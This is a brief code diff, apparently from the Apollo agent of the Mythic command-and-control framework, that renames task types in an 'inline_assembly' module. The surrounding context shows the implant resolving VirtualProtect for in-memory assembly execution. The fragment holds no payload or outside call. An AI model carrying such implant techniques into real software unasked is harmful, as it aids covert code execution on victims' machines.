@@ -21,7 +21,6 @@ using System.Runtime.CompilerServices;
 using System.Security.Principal;
 using ApolloInterop.Classes.Api;
 using ApolloInterop.Classes.IO;
-using Task = ApolloInterop.Structs.MythicStructs.Task;
 
 namespace Tasks
 {
@@ -63,7 +62,7 @@ namespace Tasks
 
         private Thread _assemblyThread;
         
-        public inline_assembly(IAgent agent, Task task) : base(agent, task)
+        public inline_assembly(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
             _pVirtualProtect = agent.GetApi().GetLibraryFunction<VirtualProtect>(Library.KERNEL32, "VirtualProtect");
             _pCommandLineToArgvW =
@@ -154,7 +153,7 @@ namespace Tasks
 
         public override void Start()
         {
-            TaskResponse resp;
+            MythicTaskResponse resp;
             TextWriter realStdOut = Console.Out;
             TextWriter realStdErr = Console.Error;
             try
